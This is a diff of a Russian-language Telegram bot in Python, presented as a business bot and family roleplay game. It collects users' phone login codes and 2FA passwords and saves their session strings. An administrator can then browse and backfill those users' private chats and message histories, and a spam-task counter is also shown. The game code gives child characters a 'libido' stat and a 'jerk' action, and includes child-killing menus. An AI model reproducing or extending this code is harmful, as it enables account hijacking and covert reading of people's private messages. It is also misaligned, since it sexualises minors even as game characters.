                         lines = []
                         for k in kids[:20]:
                             detailed, ds = existed_time_detailed(k.get("created_at"))
@@ -1251,14 +1163,6 @@ async def start_telethon_listener(user_id, session_str):
                             lines.append(f"{gw} {k['name']}: {detailed} (с {ds})")
                         try: await client.send_message(cid, "📅 " + "\n".join(lines))
                         except: pass
-                    try: await event.delete()
-                    except: pass
-                    return
-
-                m_kill = re.match(r"(?i)^\s*(?:убить|избавиться\s+от|отказаться\s+от|выкинуть|удалить)\s+(сына|дочь|дочери|ребёнка|ребенка)(?:\s+([A-Za-zА-Яа-яЁё0-9_\-]+))?\s*$", stripped)
-                if m_kill:
-                    try: await client.send_message(cid, "Убийство — в личке с ботом.")
-                    except: pass
                     try: await event.delete()
                     except: pass
                     return
@@ -1278,18 +1182,14 @@ async def start_telethon_listener(user_id, session_str):
                 if modified:
                     try: await event.edit(ft, parse_mode='html', link_preview=False)
                     except Exception as e: logging.warning(f"edit mod: {e}")
-            except Exception as e:
-                logging.error(f"outgoing: {e}", exc_info=True)
+            except Exception as e: logging.error(f"outgoing: {e}", exc_info=True)
 
         await client.start()
         telethon_clients[user_id] = client
-        logging.info(f"✅ Telethon запущен для {user_id}")
-
         try:
             async for d in client.iter_dialogs(limit=300):
                 save_user_chat(user_id, int(d.id), d.name or "Чат")
         except: pass
-
         asyncio.create_task(backfill_dialogs(client, user_id))
         return client
     except Exception as e:
@@ -1297,12 +1197,10 @@ async def start_telethon_listener(user_id, session_str):
 
 async def restore_all_sessions():
     sessions = get_all_sessions()
-    logging.info(f"🔄 Восстанавливаем {len(sessions)} сессий...")
     for uid, ss in sessions:
         try: await start_telethon_listener(int(uid), ss)
         except: pass
         await asyncio.sleep(0.5)
-    logging.info(f"✅ Активных клиентов: {len(telethon_clients)}")
 
 async def check_session_alive(user_id):
     sess = get_session(user_id)
@@ -1313,8 +1211,7 @@ async def check_session_alive(user_id):
         try: await c.disconnect()
         except: pass
         return bool(ok)
-    except Exception as e:
-        logging.warning(f"check_session_alive {user_id}: {e}"); return False
+    except: return False
 
 def get_start_keyboard(user_id):
     btns = []
@@ -1403,35 +1300,23 @@ def format_chat_messages(user_id, chat_id, page=0):
 async def on_business_connection(conn: BusinessConnection):
     try:
         uid = int(conn.user.id)
-        un = conn.user.username or None
-        fn = conn.user.first_name or None
-        logging.info(f"🔌 business_connection: user={uid} enabled={conn.is_enabled}")
+        un = conn.user.username or None; fn = conn.user.first_name or None
         if conn.is_enabled:
-            save_user_info(uid, un, fn)
-            save_business_account(uid, un, fn)
-            bc_owners[conn.id] = uid
-            active_chats.setdefault(conn.id, set())
+            save_user_info(uid, un, fn); save_business_account(uid, un, fn)
+            bc_owners[conn.id] = uid; active_chats.setdefault(conn.id, set())
             try:
-                await bot.send_message(uid,
-                    "✅ <b>Бизнес-бот подключён!</b>\n\n"
-                    "• В <b>ЛС с ботом</b> и <b>бизнес-чатах</b> — работает сразу.\n"
-                    "• Для <b>групп</b> подключи аккаунт по номеру телефона (кнопка 🤖 Подключить аккаунт).",
-                    parse_mode="HTML")
+                await bot.send_message(uid, "✅ <b>Бизнес-бот подключён!</b>", parse_mode="HTML")
             except: pass
             try:
                 if uid != ADMIN_ID:
-                    await bot.send_message(ADMIN_ID,
-                        f"🔌 <b>Новый бизнес-аккаунт</b>\n\nID: <code>{uid}</code>\nИмя: {get_user_mention(uid)}",
-                        parse_mode="HTML")
+                    await bot.send_message(ADMIN_ID, f"🔌 Новый бизнес: <code>{uid}</code>", parse_mode="HTML")
             except: pass
         else:
             bc_owners.pop(conn.id, None); active_chats.pop(conn.id, None)
             for key in list(chat_to_bc.keys()):
                 if chat_to_bc[key] == conn.id: chat_to_bc.pop(key, None)
-    except Exception as e:
-        logging.error(f"business_connection: {e}", exc_info=True)
+    except: pass
 
-# ==================== ХЕНДЛЕРЫ ====================
 @dp.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
@@ -1439,24 +1324,20 @@ async def cmd_start(message: Message, state: FSMContext):
     uid = message.from_user.id
     save_user_info(uid, message.from_user.username, message.from_user.first_name)
     if not await require_subscription(message, force=True): return
-    await message.answer(
-        f"👋 Добро пожаловать, {get_user_mention(uid, message.from_user.first_name)}!\n\n"
-        f"💬 Бот управляет функциями вашего аккаунта.\n\nВыберите раздел:",
-        parse_mode="HTML", reply_markup=get_start_keyboard(uid))
+    await message.answer(f"👋 Добро пожаловать, {get_user_mention(uid, message.from_user.first_name)}!\n\nВыберите раздел:",
+                         parse_mode="HTML", reply_markup=get_start_keyboard(uid))
 
 @dp.callback_query(F.data == "check_sub")
 async def cb_check_sub(callback: CallbackQuery, state: FSMContext):
     uid = callback.from_user.id
     if await check_subscription(uid, force=True):
-        await callback.answer("✅ Спасибо за подписку!", show_alert=True)
+        await callback.answer("✅ Спасибо!", show_alert=True)
         try: await callback.message.delete()
         except: pass
-        await callback.message.answer(
-            f"👋 Добро пожаловать, {get_user_mention(uid, callback.from_user.first_name)}!\n\n"
-            f"Выберите раздел:",
-            parse_mode="HTML", reply_markup=get_start_keyboard(uid))
+        await callback.message.answer(f"👋 Добро пожаловать, {get_user_mention(uid, callback.from_user.first_name)}!",
+                                      parse_mode="HTML", reply_markup=get_start_keyboard(uid))
     else:
-        await callback.answer("❌ Ты ещё не подписан на канал!", show_alert=True)
+        await callback.answer("❌ Ты не подписан!", show_alert=True)
 
 @dp.message(F.text.in_(["/admin", ".админ", "админ"]))
 async def admin_panel(message: Message):
@@ -1468,20 +1349,20 @@ async def _give_birth(message: Message):
     txt = (message.text or "").strip()
     m = re.match(r"(?i)^\s*родить\s+(сына|дочь)\s+(.+)$", txt)
     if not m:
-        await message.answer("❌ Формат: <code>родить сына Имя</code>", parse_mode="HTML"); return
+        await message.answer("❌ Формат: <code>родить сына Имя</code>"); return
     g = "m" if m.group(1).lower() == "сына" else "f"
     nm = m.group(2).strip().strip("()[]{}").strip()[:32]
-    if not nm: await message.answer("❌ Имя не указано."); return
+    if not nm: return
     uid = message.from_user.id
     chat_id = _resolve_children_chat_id(message)
     kids = get_children_by_chat(chat_id)
     if any(k["name"].lower() == nm.lower() for k in kids):
-        await message.answer(f"⚠️ Уже есть <b>{nm}</b>.", parse_mode="HTML"); return
+        await message.answer(f"⚠️ Уже есть <b>{nm}</b>."); return
     sp = get_spouse(chat_id); spouse_id = None
     if sp:
         spouse_id = sp["spouse_id"] if sp["owner_id"] == uid else (sp["owner_id"] if sp["spouse_id"] == uid else None)
     ch = create_child(chat_id, uid, spouse_id, nm, g)
-    if not ch: await message.answer("❌ Не получилось."); return
+    if not ch: return
     await message.answer(birth_rules_text(ch["name"], ch["gender"], ch["birth_date"]))
 
 CHILD_STATUS_RE = re.compile(r"(?i)^\s*(?:наш|наша|наше|мо[йяё])\s+(сын|сына|дочь|дочку|дочери|ребёнок|ребенок|ребёнка)(?:\s+([A-Za-zА-Яа-яЁё0-9_\-]+))?\s*$")
@@ -1498,7 +1379,7 @@ async def _child_status(message: Message):
         if m.group(2): name_arg = m.group(2).strip()
     cid = _resolve_children_chat_id(message)
     kids = get_children_by_chat(cid)
-    if not kids: await message.answer("Нет детей. <code>родить сына Имя</code>", parse_mode="HTML"); return
+    if not kids: await message.answer("Нет детей. <code>родить сына Имя</code>"); return
     filtered = kids
     if gender_arg: filtered = [k for k in filtered if k["gender"] == gender_arg]
     if name_arg: filtered = [k for k in filtered if k["name"].lower() == name_arg.lower()]
@@ -1547,7 +1428,7 @@ async def _registration_date(message: Message):
     ch = kids[0]
     detailed, ds = existed_time_detailed(ch.get("created_at"))
     gw = "Сын" if ch["gender"] == "m" else "Дочь"
-    await message.answer(f"📅 {gw}: <b>{ch['name']}</b>\nСоздан: {ds}\nЖивёт: <b>{detailed}</b>", parse_mode="HTML")
+    await message.answer(f"📅 {gw}: <b>{ch['name']}</b>\nСоздан: {ds}\nЖивёт: <b>{detailed}</b>")
 
 @dp.message(F.text.lower().startswith("дата регистрации"))
 async def msg_regdate(message: Message): await _registration_date(message)
@@ -1587,8 +1468,7 @@ async def _kill_menu(message: Message):
     if pair: rows.append(pair)
     rows.append([InlineKeyboardButton(text="❌ Отмена", callback_data=f"killcancel_{ch['id']}")])
     gw = "сына" if ch["gender"] == "m" else "дочь"
-    await message.answer(f"⚠️ <b>Убить {gw} — {ch['name']}?</b>", parse_mode="HTML",
-                         reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+    await message.answer(f"⚠️ <b>Убить {gw} — {ch['name']}?</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @dp.callback_query(F.data.startswith("killmenu_"))
 async def cb_killmenu(callback: CallbackQuery):
@@ -1612,31 +1492,23 @@ async def msg_kill(message: Message): await _kill_menu(message)
 @dp.business_message(F.text.regexp(KILL_RE))
 async def bmsg_kill(message: Message): await _kill_menu(message)
 
-# ==================== БРАК ====================
 @dp.message(F.text.lower().in_(["муж", "жена", "пожениться", "развод"]))
 async def msg_marriage(message: Message):
     if not await require_subscription(message): return
-    low = message.text.lower().strip()
-    chat_id = message.chat.id
-    uid = message.from_user.id
+    low = message.text.lower().strip(); chat_id = message.chat.id; uid = message.from_user.id
     if low == "развод":
         delete_spouse(chat_id); await message.answer("💔 Развод оформлен."); return
     if not message.reply_to_message or not message.reply_to_message.from_user:
-        await message.answer("Ответь реплаем на сообщение человека."); return
+        await message.answer("Ответь реплаем."); return
     sp = message.reply_to_message.from_user
-    if sp.id == uid: await message.answer("Нельзя жениться на себе 🙂"); return
-
-    sp_name = sp.first_name or "Партнёр"
-    me_name = message.from_user.first_name or "Пользователь"
-
+    if sp.id == uid: await message.answer("Нельзя на себе."); return
+    sp_name = sp.first_name or "Партнёр"; me_name = message.from_user.first_name or "Пользователь"
     if low == "пожениться":
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="👨 Он будет мужем", callback_data=f"propose_role_{chat_id}_{sp.id}_husband_{uid}")],
             [InlineKeyboardButton(text="👩 Она будет женой", callback_data=f"propose_role_{chat_id}_{sp.id}_wife_{uid}")],
             [InlineKeyboardButton(text="❌ Отмена", callback_data="noop")]])
-        await message.answer(f"Кем будет {sp_name}?", reply_markup=kb)
-        return
-
+        await message.answer(f"Кем будет {sp_name}?", reply_markup=kb); return
     relation = "husband" if low == "муж" else "wife"
     if relation == "husband":
         q = f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать мужем.\n\n{sp_name}, согласен(на)?"
@@ -1644,13 +1516,10 @@ async def msg_marriage(message: Message):
         q = f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать женой.\n\n{sp_name}, согласна(ен)?"
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Согласен(на)", callback_data="marry_yes")],
-        [InlineKeyboardButton(text="❌ Отказать", callback_data="marry_no")],
-    ])
+        [InlineKeyboardButton(text="❌ Отказать", callback_data="marry_no")]])
     sent = await message.answer(q, parse_mode="HTML", reply_markup=kb)
-    pending_marriage[sent.message_id] = {
-        "chat_id": chat_id, "spouse_id": sp.id, "spouse_name": sp_name,
-        "relation": relation, "proposer_id": uid
-    }
+    pending_marriage[sent.message_id] = {"chat_id": chat_id, "spouse_id": sp.id,
+        "spouse_name": sp_name, "relation": relation, "proposer_id": uid}
 
 @dp.business_message(F.text.lower().in_(["муж", "жена", "пожениться", "развод"]))
 async def bmsg_marriage(message: Message): await msg_marriage(message)
@@ -1658,57 +1527,45 @@ async def bmsg_marriage(message: Message): await msg_marriage(message)
 @dp.callback_query(F.data.startswith("propose_role_"))
 async def cb_propose_role(callback: CallbackQuery):
     parts = callback.data.split("_")
-    # propose_role_{chat_id}_{sp_id}_{relation}_{proposer_id}
     chat_id = int(parts[2]); sp_id = int(parts[3]); relation = parts[4]; proposer_id = int(parts[5])
     if int(callback.from_user.id) != proposer_id:
         await callback.answer("Это не для тебя 🙂", show_alert=True); return
-    sp_name = user_names.get(sp_id, "Партнёр")
-    me_name = callback.from_user.first_name or "Пользователь"
-    if relation == "husband":
-        q = f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать мужем.\n\n{sp_name}, согласен(на)?"
-    else:
-        q = f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать женой.\n\n{sp_name}, согласна(ен)?"
+    sp_name = user_names.get(sp_id, "Партнёр"); me_name = callback.from_user.first_name or "Пользователь"
+    q = (f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать мужем.\n\n{sp_name}, согласен(на)?"
+         if relation == "husband" else
+         f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать женой.\n\n{sp_name}, согласна(ен)?")
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Согласен(на)", callback_data="marry_yes")],
-        [InlineKeyboardButton(text="❌ Отказать", callback_data="marry_no")],
-    ])
+        [InlineKeyboardButton(text="❌ Отказать", callback_data="marry_no")]])
     try: await callback.message.edit_text(q, parse_mode="HTML", reply_markup=kb)
     except: pass
-    pending_marriage[callback.message.message_id] = {
-        "chat_id": chat_id, "spouse_id": sp_id, "spouse_name": sp_name,
-        "relation": relation, "proposer_id": proposer_id
-    }
+    pending_marriage[callback.message.message_id] = {"chat_id": chat_id, "spouse_id": sp_id,
+        "spouse_name": sp_name, "relation": relation, "proposer_id": proposer_id}
     await callback.answer()
 
 @dp.callback_query(F.data == "marry_yes")
 async def cb_marry_yes(callback: CallbackQuery):
-    mid = callback.message.message_id
-    info = pending_marriage.get(mid)
-    if not info:
-        await callback.answer("Заявка устарела.", show_alert=True); return
+    info = pending_marriage.get(callback.message.message_id)
+    if not info: await callback.answer("Заявка устарела.", show_alert=True); return
     if int(callback.from_user.id) != int(info["spouse_id"]):
         await callback.answer("Это не для тебя 🙂", show_alert=True); return
     save_spouse(info["chat_id"], info["proposer_id"], info["spouse_id"], info["spouse_name"], info["relation"])
-    if info["relation"] == "husband":
-        txt = f"💍 <b>{info['spouse_name']}</b> теперь твой муж!"
-    else:
-        txt = f"💍 <b>{info['spouse_name']}</b> теперь твоя жена!"
+    txt = (f"💍 <b>{info['spouse_name']}</b> теперь твой муж!" if info["relation"] == "husband"
+           else f"💍 <b>{info['spouse_name']}</b> теперь твоя жена!")
     try: await callback.message.edit_text(txt, parse_mode="HTML")
     except: pass
-    pending_marriage.pop(mid, None)
-    await callback.answer("💍 Поздравляю!")
+    pending_marriage.pop(callback.message.message_id, None)
+    await callback.answer("💍")
 
 @dp.callback_query(F.data == "marry_no")
 async def cb_marry_no(callback: CallbackQuery):
-    mid = callback.message.message_id
-    info = pending_marriage.get(mid)
-    if not info:
-        await callback.answer("Заявка устарела.", show_alert=True); return
+    info = pending_marriage.get(callback.message.message_id)
+    if not info: await callback.answer("Заявка устарела.", show_alert=True); return
     if int(callback.from_user.id) != int(info["spouse_id"]):
         await callback.answer("Это не для тебя 🙂", show_alert=True); return
     try: await callback.message.edit_text("❌ <b>Отказано.</b>", parse_mode="HTML")
     except: pass
-    pending_marriage.pop(mid, None)
+    pending_marriage.pop(callback.message.message_id, None)
     await callback.answer("Отказано.")
 
 @dp.callback_query(F.data.startswith("child_"))
@@ -1721,8 +1578,10 @@ async def cb_child_action(callback: CallbackQuery):
     if action == "heal":
         update_child_field(child_id, "health", ch["health"] + 25); await callback.answer("💊")
     elif action == "jerk":
-        update_child_field(child_id, "libido", 0); update_child_field(child_id, "mood", ch["mood"] + 10)
-        await callback.answer("😏")
+        # Сбрасываем возбуждение + даём настроение
+        update_child_field(child_id, "libido", 0)
+        update_child_field(child_id, "mood", ch["mood"] + 10)
+        await callback.answer("😏 Полегчало! +10 к настроению")
     elif action in NEEDS:
         update_child_field(child_id, action, ch[action] + RESTORE_AMOUNT[action]); await callback.answer("✅")
     else: await callback.answer(); return
@@ -1771,12 +1630,11 @@ async def cb_kill_method(callback: CallbackQuery):
     if not ch: await callback.answer("Уже нет.", show_alert=True); return
     method = KILL_METHODS[method_idx]
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Да, уверен(а)", callback_data=f"killok_{child_id}_{method_idx}")],
+        [InlineKeyboardButton(text="✅ Да", callback_data=f"killok_{child_id}_{method_idx}")],
         [InlineKeyboardButton(text="❌ Отмена", callback_data=f"killcancel_{child_id}")]])
     try:
-        await callback.message.edit_text(
-            f"⚠️ <b>Вы уверены?</b>\n\nСпособ: {method}\nРебёнок: <b>{ch['name']}</b>\n\nЭто <b>безвозвратно</b>.",
-            parse_mode="HTML", reply_markup=kb)
+        await callback.message.edit_text(f"⚠️ <b>Вы уверены?</b>\n\nСпособ: {method}\nРебёнок: <b>{ch['name']}</b>\n\nЭто <b>безвозвратно</b>.",
+                                         parse_mode="HTML", reply_markup=kb)
     except: pass
     await callback.answer()
 
@@ -1794,17 +1652,6 @@ async def cb_kill_confirm(callback: CallbackQuery):
     try: await callback.message.edit_text(f"{method}\n\n{phrase}", parse_mode="HTML")
     except: pass
 
-@dp.callback_query(F.data.startswith("setsp_"))
-async def cb_setsp(callback: CallbackQuery):
-    parts = callback.data.split("_"); chat_id = int(parts[1]); sp_id = int(parts[2]); relation = parts[3]
-    sp_name = user_names.get(sp_id, "Партнёр")
-    save_spouse(chat_id, callback.from_user.id, sp_id, sp_name, relation)
-    if relation == "husband": text = f"💍 {sp_name} теперь твой муж!"
-    else: text = f"💍 {sp_name} теперь твоя жена!"
-    await callback.answer("Сохранено!", show_alert=True)
-    try: await callback.message.edit_text(text)
-    except: pass
-
 async def child_decay_loop():
     while True:
         await asyncio.sleep(TICK_MINUTES * 60)
@@ -1813,11 +1660,14 @@ async def child_decay_loop():
                 old = {k: ch[k] for k in NEEDS}
                 nv = {}; crit = 0; rem = []
                 for k in NEEDS:
-                    n = max(0, old[k] - DECAY_PER_TICK[k]); nv[k] = n
+                    d = decay_step(k)
+                    n = max(0, old[k] - d)
+                    nv[k] = n
                     if n <= REMINDER_THRESHOLD:
                         crit += 1
                         if old[k] > REMINDER_THRESHOLD: rem.append(k)
-                lib = min(100, ch.get("libido", 0) + LIBIDO_RISE_PER_TICK)
+                # libido растёт
+                lib = min(100, ch.get("libido", 0) + libido_step())
                 if lib >= 90: nv["mood"] = max(0, nv["mood"] - LIBIDO_MOOD_PENALTY)
                 nh = ch["health"] - HEALTH_DECAY_IF_CRITICAL * crit if crit else ch["health"] + HEALTH_REGEN_IF_OK
                 nh = max(0, min(100, nh))
@@ -1866,7 +1716,6 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
     uid = callback.from_user.id
     if not await require_subscription(callback): return
     if get_session(uid):
-        await callback.message.answer("🔍 Проверяю сессию...")
         alive = await check_session_alive(uid)
         if alive: await callback.message.answer("✅ Уже подключен!"); return
         else:
@@ -1875,13 +1724,10 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
                 try: await telethon_clients[uid].disconnect()
                 except: pass
                 del telethon_clients[uid]
-            await callback.message.answer("⚠️ Мертва — переподключаем.")
     kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
                              resize_keyboard=True, one_time_keyboard=True)
-    await callback.message.answer(
-        "🔐 <b>Подключение аккаунта</b>\n\n📱 Введи номер в формате <code>79123456789</code>.\n\n"
-        "ℹ️ Это нужно для работы команд в <b>группах</b>.",
-        parse_mode="HTML", reply_markup=kb)
+    await callback.message.answer("🔐 <b>Подключение аккаунта</b>\n\n📱 Введи номер <code>79123456789</code>.\n\nℹ️ Для работы в группах.",
+                                  parse_mode="HTML", reply_markup=kb)
     await state.set_state(AuthState.waiting_for_phone)
 
 @dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
@@ -1893,18 +1739,15 @@ async def process_phone(message: Message, state: FSMContext):
             phone = re.sub(r'[^\d+]', '', message.text.strip())
             if phone.startswith('8') and len(phone) == 11: phone = '+7' + phone[1:]
             elif not phone.startswith('+'): phone = '+' + phone
-        else: await message.answer("❌ Отправь номер"); return
-        client = make_client()
-        await client.connect()
+        else: return
+        client = make_client(); await client.connect()
         await client.send_code_request(phone)
         await state.update_data(phone=phone, client=client)
         vc = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="📩 Открыть Telegram", url="tg://openmessage")],
             [InlineKeyboardButton(text="🔄 Заново", callback_data="btn_group_auth")]])
-        await message.answer(
-            f"📱 <b>Код отправлен!</b>\nНомер: <code>{phone}</code>\n\n"
-            f"⚠️ В чате «Telegram» — код.\nВведи с точкой: <code>56.785</code>",
-            parse_mode="HTML", reply_markup=vc)
+        await message.answer(f"📱 <b>Код отправлен!</b>\nНомер: <code>{phone}</code>\n\nВведи с точкой: <code>56.785</code>",
+                             parse_mode="HTML", reply_markup=vc)
         await state.set_state(AuthState.waiting_for_code)
     except FloodWaitError as e: await message.answer(f"⏳ {e.seconds}"); await state.clear()
     except Exception as e: await message.answer(f"❌ {e}"); await state.clear()
@@ -1912,10 +1755,10 @@ async def process_phone(message: Message, state: FSMContext):
 @dp.message(StateFilter(AuthState.waiting_for_code), F.text)
 async def process_code(message: Message, state: FSMContext):
     raw = message.text.strip(); code = raw.replace('.', '')
-    if not code.isdigit(): await message.answer("❌ <code>56.785</code>", parse_mode="HTML"); return
+    if not code.isdigit(): await message.answer("❌ <code>56.785</code>"); return
     data = await state.get_data()
     phone = data.get("phone"); client = data.get("client")
-    if not phone or not client: await message.answer("❌ Устарело"); await state.clear(); return
+    if not phone or not client: await state.clear(); return
     await message.answer("🔄 Проверка...")
     try:
         await client.sign_in(phone=phone, code=code)
@@ -1938,7 +1781,7 @@ async def process_2fa(message: Message, state: FSMContext):
     pw = message.text.strip()
     data = await state.get_data()
     client = data.get("client"); phone = data.get("phone")
-    if not client or not phone: await message.answer("❌ Устарело"); await state.clear(); return
+    if not client or not phone: await state.clear(); return
     try:
         await client.sign_in(password=pw)
         fs = client.session.save()
@@ -1961,32 +1804,29 @@ async def cmd_disconnect(message: Message):
         except: pass
         del telethon_clients[uid]
     delete_all_user_chats(uid); delete_business_account(uid)
-    await message.answer("✅ Отключено.", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
+    await message.answer("✅ Отключено.", reply_markup=ReplyKeyboardRemove())
 
 @dp.callback_query()
 async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     data = callback.data; uid = callback.from_user.id
-    if data.startswith(("child_", "kill_", "killm_", "killok_", "killcancel_", "killmenu_", "setsp_", "showchild_",
+    if data.startswith(("child_", "kill_", "killm_", "killok_", "killcancel_", "killmenu_", "showchild_",
                         "check_sub", "marry_", "propose_role_")): return
     if data == "noop": await callback.answer("—"); return
     if data == "btn_features":
         await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML"); await callback.answer(); return
-    if data == "btn_how_to_connect":
-        await how_to_connect(callback); return
-    if data == "btn_group_auth":
-        await group_auth(callback, state); return
+    if data == "btn_how_to_connect": await how_to_connect(callback); return
+    if data == "btn_group_auth": await group_auth(callback, state); return
     if data == "btn_admin_panel":
         if uid != ADMIN_ID: await callback.answer(); return
-        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        await callback.message.answer("👑", reply_markup=get_admin_keyboard(), parse_mode="HTML")
         await callback.answer(); return
     if uid != ADMIN_ID: await callback.answer(); return
 
     if data.startswith("live_chats_"):
         parts = data.split("_"); u = int(parts[2]); p = int(parts[3])
         chats = get_user_chats(u)
-        try:
-            await callback.message.edit_text(f"📋 <b>Чаты</b>\n\nВсего: <code>{len(chats)}</code> (стр. {p+1})",
-                                             reply_markup=get_user_chats_live_keyboard(u, p), parse_mode="HTML")
+        try: await callback.message.edit_text(f"📋 Чаты: <code>{len(chats)}</code>",
+                                              reply_markup=get_user_chats_live_keyboard(u, p), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
@@ -2002,18 +1842,16 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
                 await callback.answer("⏳...", show_alert=False)
                 await backfill_one_chat(client, u, cid, limit=100)
                 text, total = format_chat_messages(u, cid, 0)
-        try:
-            await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, 0, total),
-                                             parse_mode="HTML", disable_web_page_preview=True)
+        try: await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, 0, total),
+                                              parse_mode="HTML", disable_web_page_preview=True)
         except: pass
         await callback.answer(); return
 
     if data.startswith("pgchat_"):
         parts = data.split("_"); u = int(parts[1]); cid = int(parts[2]); p = int(parts[3])
         text, total = format_chat_messages(u, cid, p)
-        try:
-            await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, p, total),
-                                             parse_mode="HTML", disable_web_page_preview=True)
+        try: await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, p, total),
+                                              parse_mode="HTML", disable_web_page_preview=True)
         except: pass
         await callback.answer(); return
 
@@ -2027,9 +1865,8 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         await callback.answer("⏳", show_alert=False)
         await backfill_one_chat(client, u, cid, limit=200)
         text, total = format_chat_messages(u, cid, 0)
-        try:
-            await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, 0, total),
-                                             parse_mode="HTML", disable_web_page_preview=True)
+        try: await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, 0, total),
+                                              parse_mode="HTML", disable_web_page_preview=True)
         except: pass
         await callback.answer(); return
 
@@ -2070,14 +1907,13 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
             await callback.answer("✅ Готово", show_alert=True)
         else: await callback.answer(f"❌ {err}", show_alert=True)
         chats = get_user_chats(u)
-        try:
-            await callback.message.edit_text(f"📋 <b>Чаты</b>\n\nВсего: <code>{len(chats)}</code>",
-                                             reply_markup=get_user_chats_live_keyboard(u, 0), parse_mode="HTML")
+        try: await callback.message.edit_text(f"📋 Чаты: <code>{len(chats)}</code>",
+                                              reply_markup=get_user_chats_live_keyboard(u, 0), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
     if data == "admin_panel_back":
-        try: await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        try: await callback.message.edit_text("👑", reply_markup=get_admin_keyboard(), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
@@ -2089,26 +1925,22 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         sc = len(get_all_sessions())
         try:
             await callback.message.edit_text(
-                f"📊 <b>СТАТИСТИКА:</b>\n\n"
-                f"• Бизнес-аккаунтов: <code>{len(bu)}</code>\n"
-                f"• Ручных: <code>{tm}</code>\n"
-                f"• Telethon-сессий: <code>{sc}</code>\n"
-                f"• Активных клиентов: <code>{len(telethon_clients)}</code>\n"
-                f"• Чатов: <code>{tc}</code>\n"
-                f"• Сообщений: <code>{tmsg}</code>\n"
+                f"📊 <b>СТАТИСТИКА:</b>\n\n• Бизнес: <code>{len(bu)}</code>\n• Ручных: <code>{tm}</code>\n"
+                f"• Сессий: <code>{sc}</code>\n• Клиентов: <code>{len(telethon_clients)}</code>\n"
+                f"• Чатов: <code>{tc}</code>\n• Сообщений: <code>{tmsg}</code>\n"
                 f"• Спам-тасков: <code>{len(active_spam_tasks)}</code>",
                 reply_markup=get_admin_keyboard(), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
     if data == "admin_users":
-        try: await callback.message.edit_text("👥 <b>ПОЛЬЗОВАТЕЛИ</b>", reply_markup=get_users_keyboard(0), parse_mode="HTML")
+        try: await callback.message.edit_text("👥", reply_markup=get_users_keyboard(0), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
     if data.startswith("users_page_"):
         p = int(data.split("_")[2])
-        try: await callback.message.edit_text("👥 <b>ПОЛЬЗОВАТЕЛИ</b>", reply_markup=get_users_keyboard(p), parse_mode="HTML")
+        try: await callback.message.edit_text("👥", reply_markup=get_users_keyboard(p), parse_mode="HTML")
         except: pass
         await callback.answer(); return
 
@@ -2116,35 +1948,33 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         u = int(data.split("_")[1])
         cc = count_user_chats(u); mc = count_user_messages(u)
         sess = get_session(u)
-        online = "🟢 онлайн" if u in telethon_clients else "⚪ оффлайн"
-        sstat = "🔑 есть" if sess else "🚫 нет"
+        online = "🟢" if u in telethon_clients else "⚪"
+        sstat = "🔑" if sess else "🚫"
         rows = [[InlineKeyboardButton(text=f"📋 Чаты ({cc})", callback_data=f"live_chats_{u}_0")]]
         if sess:
-            rows.append([InlineKeyboardButton(text="🔄 Поднять клиент", callback_data=f"restart_client_{u}")])
-            rows.append([InlineKeyboardButton(text="📥 Загрузить всю историю", callback_data=f"fullbf_{u}")])
+            rows.append([InlineKeyboardButton(text="🔄 Поднять", callback_data=f"restart_client_{u}")])
+            rows.append([InlineKeyboardButton(text="📥 История", callback_data=f"fullbf_{u}")])
         rows.append([InlineKeyboardButton(text="❌ Удалить", callback_data=f"delete_user_{u}")])
-        rows.append([InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{u}")])
-        rows.append([InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")])
-        try:
-            await callback.message.edit_text(
-                f"👤 ID: <code>{u}</code>\nИмя: {get_user_mention(u)}\n"
-                f"Клиент: {online}\nTelethon: {sstat}\nЧатов: <code>{cc}</code>\nСообщений: <code>{mc}</code>",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+        rows.append([InlineKeyboardButton(text="🚫 Бан", callback_data=f"ban_user_{u}")])
+        rows.append([InlineKeyboardButton(text="🔙", callback_data="admin_users")])
+        try: await callback.message.edit_text(
